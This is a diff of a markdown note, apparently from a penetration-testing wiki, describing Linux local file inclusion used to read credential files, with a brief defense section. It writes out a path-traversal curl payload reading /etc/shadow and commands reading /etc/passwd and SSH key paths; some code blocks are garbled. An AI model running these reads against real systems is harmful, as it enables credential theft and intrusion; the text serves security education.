@@ -28,11 +28,15 @@ Linux File Inclusion to Remote Code Execution via Credentials Files is a techniq
 
 Linux File Inclusion to Remote Code Execution via Credentials Files is a technique used by attackers to escalate their privileges on a target Linux machine. It involves exploiting a Local File Inclusion vulnerability to read sensitive files such as /etc/shadow, /etc/passwd, and SSH private key files. With the credentials obtained, attackers can then escalate their privileges and execute remote code on the target machine. This technique is commonly used in combination with other techniques to achieve initial access to a target environment.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable Linux machine
 
 1. Knowledge of the target Linux system
+
+ 
 
 ## Defense
 
@@ -42,6 +46,8 @@ Linux File Inclusion to Remote Code Execution via Credentials Files is a techniq
 
 1. Use strong passwords and enforce password policies to make it harder for attackers to crack passwords
 
+ 
+
 ## Objectives
 
 1. Gain access to sensitive files on a target Linux machine
@@ -50,13 +56,23 @@ Linux File Inclusion to Remote Code Execution via Credentials Files is a techniq
 
 1. Execute remote code on the target machine
 
+ 
+
 # Instructions
 
 1. cat /etc/shadow
 
+ 
+
+
+
 **Code**: [[/etc/shadow]]
 
+
+
 > This command will display the contents of the /etc/shadow file, which contains the encrypted passwords of the users on the system.
+
+
 
 **Command** ([[View /etc/shadow file]]):
 
@@ -64,17 +80,33 @@ Linux File Inclusion to Remote Code Execution via Credentials Files is a techniq
 /etc/shadow
 ```
 
+
+
 2. curl http://example.com/index.php?page=../../../../../../etc/shadow
 
+ 
+
+
+
 **Code**: [[http://example.com/index.php?page=../../../../../.]]
+
+
 
 > This command will exploit the LFI vulnerability to read the /etc/shadow file, which contains the encrypted passwords of the users on the system. With the credentials obtained, attackers can then escalate their privileges and execute remote code on the target machine.
 
 3. cat /proc/self/status
 
+ 
+
+
+
 **Code**: [[/proc/self/status]]
 
+
+
 > This command will display the contents of the /proc/self/status file, which contains information about the current process. Attackers can use this file to determine which user is running the process and then try to access the /<HOME>/.ssh/id_rsa file to gain SSH access to the target machine.
+
+
 
 **Command** ([[Process Status]]):
 
@@ -82,18 +114,30 @@ Linux File Inclusion to Remote Code Execution via Credentials Files is a techniq
 cat /proc/self/status
 ```
 
+
+
 4. cat /etc/passwd
 ls -la /<HOME>/.ssh/id_rsa
 
+ 
+
+
+
 **Code**: [[/etc/passwd]]
 
+
+
 > This command will display the contents of the /etc/passwd file, which contains information about the users on the system. Attackers can use this file to determine the home directory of the user they are targeting and then try to access the /<HOME>/.ssh/id_rsa file to gain SSH access to the target machine.
+
+
 
 **Command** ([[View /etc/passwd file]]):
 
 ```bash
 /etc/passwd
 ```
+
+
 
 ## Commands Used
 
@@ -106,3 +150,5 @@ ls -la /<HOME>/.ssh/id_rsa
 - [[File Inclusion]]
 - [[LFI to RCE via credentials files]]
 - [[Linux version]]
+
+
